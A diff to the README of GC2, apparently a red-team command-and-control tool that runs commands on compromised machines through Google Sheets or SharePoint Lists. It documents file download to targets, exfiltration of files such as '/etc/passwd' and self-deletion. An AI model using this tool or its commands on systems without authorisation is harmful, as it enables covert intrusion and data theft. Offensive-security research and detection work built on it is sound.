@@ -24,6 +24,72 @@ Furthermore, the program will interact only with Google and Microsoft's domains 
   <img alt="Work Flow" src="img/Microsoft_workflow.png" height="60%" width="60%">
 </p>
 
+# Features
+
+- **Command execution** using Google Sheet or Microsoft SharePoint List as a console
+- **Download files** on the target using Google Drive or Microsoft SharePoint Document
+- **Data exfiltration** using Google Drive or Microsoft SharePoint Document
+- Self-kill switch and **auto-delete** from the target machine
+
+## Command execution
+
+### Google
+
+A Google Sheet will be automatically created by the C2. Once created you can interact with the compromised system as shown below.
+
+   <p align="center">
+        <img alt="Sheet Permission" src="img/Google_usage.png" height="60%" width="60%">
+    </p>
+
+### Microsoft
+
+A Microsoft SharePoint List will be automatically created by the C2. Once created you can interact with the compromised system as shown below.
+
+   <p align="center">
+        <img alt="Sheet Permission" src="img/Microsoft_usage.png" height="60%" width="60%">
+    </p>
+
+## Data exfiltration file
+
+Special command is reserved to exfiltrate files form the target system.
+
+ ```
+From Target to Google Drive/Microsoft SharePoint Document
+upload;<local path>
+Example:
+upload;/etc/passwd
+ ```
+
+Note: files with the same name are automatically overwritten.
+
+## Download file
+
+Special command is reserved to download files to the target system.
+
+#### Google
+ ```
+ From Google Drive to Target
+download;<google drive file id>;<local path>
+Example:
+download;<file ID>;/home/user/downloaded.txt
+ ```
+
+#### Microsoft
+Note: Files need to be saved in the SharePoint root folder, usually "Documents"
+ ```
+ From SharePoint to Target
+download;<SharePoint file path>;<local path>
+Example:
+download;download.txt;/home/user/downloaded.txt
+ ```
+
+## Exit
+
+By sending the *exit* command, the C2 will kill and delete itself from the target system.
+
+PS: From *os* documentation:
+*If a symlink was used to start the process, depending on the operating system, the result might be the symlink or the path it pointed to*. In this case, the symlink is deleted.
+
 # Set up
 
 This C2 support both Google (Google Sheet + Google Drive) and Microsoft (SharePoint Lists + SharePoint Document) services. To use the C2 you need to set up both the local and cloud configuration.
@@ -101,6 +167,11 @@ To interact with Microsoft services you will first need a Business subscription 
    #Proxy: "http://127.0.0.1:8080" # optional, specify the proxy
    Verbose: true # optional, suggested for debugging purposes
     ```
+   Your Google service account key must be escaped before pasting it in the configuration file. You can use the following command to escape it:
+
+    ```
+   cat key.json | jq -r @json | sed 's/\\n/\\\\n/g' | sed 's/\"/\\"/g'
+   ```
 
    *Only Microsoft services*
    
@@ -157,72 +228,6 @@ To interact with Microsoft services you will first need a Business subscription 
 
 Most of the errors can be detected by setting the `verbose` flag to `true`. By default, the C2 does not generate any output or error information.
 
-# Features
-
-- Command execution using Google Sheet or Microsoft SharePoint List as a console
-- Download files on the target using Google Drive or Microsoft SharePoint Document
-- Data exfiltration using Google Drive or Microsoft SharePoint Document
-- Self-kill switch and auto-delete from the target machine 
-
-## Command execution
-
-### Google
-
-A Google Sheet will be automatically created by the C2. Once created you can interact with the compromised system as shown below.
-
-   <p align="center">
-        <img alt="Sheet Permission" src="img/Google_usage.png" height="60%" width="60%">
-    </p>
-
-### Microsoft
-
-A Microsoft SharePoint List will be automatically created by the C2. Once created you can interact with the compromised system as shown below.
-
-   <p align="center">
-        <img alt="Sheet Permission" src="img/Microsoft_usage.png" height="60%" width="60%">
-    </p>
-
-## Data exfiltration file
-
-Special command is reserved to exfiltrate files form the target system.
-
- ```
-From Target to Google Drive/Microsoft SharePoint Document
-upload;<local path>
-Example:
-upload;/etc/passwd
- ```
-
-Note: files with the same name are automatically overwritten.
-
-## Download file
-
-Special command is reserved to download files to the target system.
-
-#### Google 
- ```
- From Google Drive to Target
-download;<google drive file id>;<local path>
-Example:
-download;<file ID>;/home/user/downloaded.txt
- ```
-
-#### Microsoft
-Note: Files need to be saved in the SharePoint root folder, usually "Documents"
- ```
- From SharePoint to Target
-download;<SharePoint file path>;<local path>
-Example:
-download;download.txt;/home/user/downloaded.txt
- ```
-
-## Exit
-
-By sending the *exit* command, the C2 will kill and delete itself from the target system.
-
-PS: From *os* documentation: 
-*If a symlink was used to start the process, depending on the operating system, the result might be the symlink or the path it pointed to*. In this case, the symlink is deleted.
-
 # DEF CON Slides + demo
 
 [DEF CON Slide](https://drive.google.com/file/d/1cokEcUcxgR4pNRRF5lIXCsNW8kh4ME42/view?usp=sharing)
@@ -277,5 +282,6 @@ The final user is solely responsible for their actions and decisions. The use of
 [Kitploit](https://www.kitploit.com/2021/10/gc2-command-and-control-application.html)
 
 News mentioning malware using the same concept:
+
 [The Hacker News - Voldemort](https://thehackernews.com/2024/08/cyberattackers-exploit-google-sheets.html)
 [Bleeping Computer - Voldemort](https://www.bleepingcomputer.com/news/security/new-voldemort-malware-abuses-google-sheets-to-store-stolen-data/)
